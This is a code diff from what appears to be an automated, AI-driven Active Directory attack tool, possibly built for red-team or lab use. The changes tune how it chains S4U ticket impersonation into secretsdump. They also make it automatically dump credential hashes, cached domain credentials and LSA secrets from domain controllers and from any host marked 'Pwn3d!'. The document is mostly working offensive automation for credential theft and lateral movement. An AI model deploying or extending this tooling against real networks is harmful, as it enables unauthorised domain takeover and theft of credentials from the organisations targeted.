@@ -67,24 +67,16 @@ pub async fn process_completed_task(
         // All discoveries now come from regex parsers, not LLM hallucination.
     }
 
-    // Extract discoveries from the result payload
+    // Extract discoveries ONLY from the "discoveries" key — populated exclusively
+    // by ares-tools parsers in submission.rs. The top-level payload is LLM-generated
+    // and must never be fed into parse_discoveries() (hallucination risk).
     if let Some(ref payload) = result.result {
-        if let Err(e) = extract_discoveries(payload, dispatcher).await {
-            warn!(task_id = %task_id, err = %e, "Failed to extract discoveries from result");
-        }
-        // Also extract from nested "discoveries" key (structured parser output
-        // from the LLM runner is placed under result.discoveries)
         if let Some(disc) = payload.get("discoveries") {
             if let Err(e) = extract_discoveries(disc, dispatcher).await {
-                warn!(task_id = %task_id, err = %e, "Failed to extract nested discoveries");
+                warn!(task_id = %task_id, err = %e, "Failed to extract parser discoveries");
             }
             check_domain_admin_indicators(disc, dispatcher).await;
         }
-    }
-
-    // Check for domain admin indicators
-    if let Some(ref payload) = result.result {
-        check_domain_admin_indicators(payload, dispatcher).await;
     }
 
     // Secondary pass: regex-based extraction from raw text in the result.
@@ -108,9 +100,10 @@ pub async fn process_completed_task(
         auto_chain_s4u_secretsdump(payload, dispatcher, &completed.task_id).await;
     }
 
-    // Notify credential access and delegation enumeration to wake up for potential new creds
-    dispatcher.credential_access_notify.notify_one();
-    dispatcher.delegation_notify.notify_one();
+    // Notify all listeners (credential access, delegation enum, S4U automation)
+    // to wake up for potential new creds. Use notify_waiters to wake ALL listeners.
+    dispatcher.credential_access_notify.notify_waiters();
+    dispatcher.delegation_notify.notify_waiters();
 
     // Publish state update to workers
     let _ = dispatcher.notify_state_update().await;
@@ -222,11 +215,18 @@ async fn auto_chain_s4u_secretsdump(payload: &Value, dispatcher: &Arc<Dispatcher
 
     let domain = payload.get("domain").and_then(|v| v.as_str()).unwrap_or("");
 
-    // Dispatch secretsdump with ticket (no password needed)
+    // Dispatch secretsdump with ticket (no password needed).
+    // Must include username — secretsdump requires it even with -k -no-pass.
+    // The S4U impersonates Administrator, so use that as default.
+    let username = payload
+        .get("impersonate")
+        .and_then(|v| v.as_str())
+        .unwrap_or("Administrator");
     let sd_payload = serde_json::json!({
         "technique": "secretsdump",
         "techniques": ["secretsdump"],
         "target_ip": resolved_ip,
+        "username": username,
         "domain": domain,
         "ticket_path": ticket_path,
         "no_pass": true,
@@ -436,15 +436,36 @@ async fn detect_and_upgrade_admin_credentials(text: &str, dispatcher: &Arc<Dispa
                 };
 
                 if upgraded {
+                    // Extract the target IP from the Pwn3d! line. NetExec format:
+                    // SMB  10.1.2.51  445  CASTELBLACK  [+] NORTH\user:pass (Pwn3d!)
+                    let pwned_ip = line
+                        .split_whitespace()
+                        .find(|w| {
+                            w.split('.').count() == 4
+                                && w.split('.').all(|o| o.parse::<u8>().is_ok())
+                        })
+                        .map(|s| s.to_string());
+
                     info!(
                         username = %username,
                         domain = %domain,
+                        pwned_host = ?pwned_ip,
                         "Credential upgraded to admin — dispatching priority secretsdump"
                     );
 
-                    // Dispatch immediate secretsdump against all DCs
+                    // Dispatch secretsdump against all DCs AND the Pwn3d host.
+                    // The Pwn3d host may not be a DC but can yield cached domain
+                    // creds, service account hashes, and LSA secrets.
                     let work: Vec<(String, ares_core::models::Credential)> = {
                         let state = dispatcher.state.read().await;
+                        let dc_ips: Vec<String> =
+                            state.domain_controllers.values().cloned().collect();
+                        let mut targets: Vec<String> = dc_ips;
+                        if let Some(ref ip) = pwned_ip {
+                            if !targets.contains(ip) {
+                                targets.push(ip.clone());
+                            }
+                        }
                         state
                             .credentials
                             .iter()
@@ -454,21 +475,20 @@ async fn detect_and_upgrade_admin_credentials(text: &str, dispatcher: &Arc<Dispa
                                     && c.is_admin
                             })
                             .flat_map(|cred| {
-                                state
-                                    .domain_controllers
-                                    .values()
-                                    .map(|dc_ip| (dc_ip.clone(), cred.clone()))
+                                targets
+                                    .iter()
+                                    .map(|ip| (ip.clone(), cred.clone()))
                                     .collect::<Vec<_>>()
                             })
                             .collect()
                     };
 
-                    for (dc_ip, cred) in work {
-                        match dispatcher.request_secretsdump(&dc_ip, &cred, 1).await {
+                    for (target_ip, cred) in work {
+                        match dispatcher.request_secretsdump(&target_ip, &cred, 1).await {
                             Ok(Some(task_id)) => {
                                 info!(
                                     task_id = %task_id,
-                                    target = %dc_ip,
+                                    target = %target_ip,
                                     username = %username,
                                     "Admin Pwn3d! secretsdump dispatched (priority 1)"
                                 );
@@ -1101,9 +1121,9 @@ async fn poll_discoveries(dispatcher: &Dispatcher) -> Result<()> {
         }
     }
 
-    // Notify credential access and delegation enumeration after processing discoveries
-    dispatcher.credential_access_notify.notify_one();
-    dispatcher.delegation_notify.notify_one();
+    // Notify all listeners after processing discoveries
+    dispatcher.credential_access_notify.notify_waiters();
+    dispatcher.delegation_notify.notify_waiters();
     let _ = dispatcher.notify_state_update().await;
 
     Ok(())
